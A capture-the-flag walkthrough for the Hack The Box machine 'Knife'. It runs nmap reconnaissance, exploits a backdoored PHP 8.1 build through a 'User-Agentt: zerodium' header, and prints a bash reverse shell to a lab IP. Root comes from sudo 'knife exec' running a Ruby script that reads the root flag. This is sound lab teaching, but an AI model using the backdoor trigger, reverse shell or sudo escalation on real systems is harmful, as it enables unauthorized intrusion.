
#Linux #CTF #HTB 

OS: Linux 
IP : 10.10.10.242
Rank : Easy 

## setup 
```bash
echo "10.10.10.242 knifte.htb" >> /etc/hosts
```


## Recon 

Lets start firing up a nmap scan 
```bash
nmap -sV -sC  -o nmapscan knife.htb

Not shown: 998 closed ports  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)  
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)  
|\_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
| http-methods:    
|\_  Supported Methods: GET HEAD POST OPTIONS  
|\_http-server-header: Apache/2.4.41 (Ubuntu)  
|\_http-title:  Emergent Medical Idea  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
```


We see a HTTP port is open, lets go to it. 

![[Pasted image 20210523053510.png]]

A very simple HTTP page, nothing is clickable, lets try different file type. 
We can see it uses PHP, time to emulate the site for sub directory

````bash
gobuster dir -u https://knife.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50 -k
````

Nothing of value here.. 

It time for the most powerful tool *google*  lets google the Apache version for vulnabilities. 
Going to apache site we learn of two vulnabilities that have been fixed in version *2.4.42*
[Sorce](https://httpd.apache.org/security/vulnerabilities_24.html)
One of them look interesting *CVE-2020-1934* We learn that the website must have the *mod\_proxy\_ftp* mod on the website to be vulnerable. 
Nothing of value here.

Fire-up burp and lets see what the response look like from there. 

![[Pasted image 20210523062802.png]]

we learn that is uses *php/8.1*, lets try google it for any information, after alot of googling I came across a post about a backdoor created by hacker by adding code to the source. 
[source](https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/)


We learn that we can send a request with *User-agentt* that start with *zerodium*  it will then execute every php code after the code word.  

![[Pasted image 20210523065714.png]]

Fire up a netcat listner 

```bash
nc -lvnp 4444
```

As you can see we are able to execute code on the machine and get it to fire up a netcat to our machine. lets create a backdoor using netcat, insert your IP. 
```bash
'bash -c "bash -i >& /dev/tcp/10.10.14.19/4444 0>&1"'
```

And we got user access, let grap the flag

```bash
cat /home/james/user.txt
```

## Privilege escalation

Running *sudo -l* we learn that we are allow to execute knife as admin, which a tool for manage chef instance. 

[documentation](https://docs.chef.io/workstation/knife/)

By using *knife exec* we are allow to execute ruby scripts and it our case ruby code as root. 
lets create a small script which read the flag. 
 
```bash
echo 'print File.read("/root/root.txt")' > test.rb
sudo knife exec test.rb
```

And we got root.
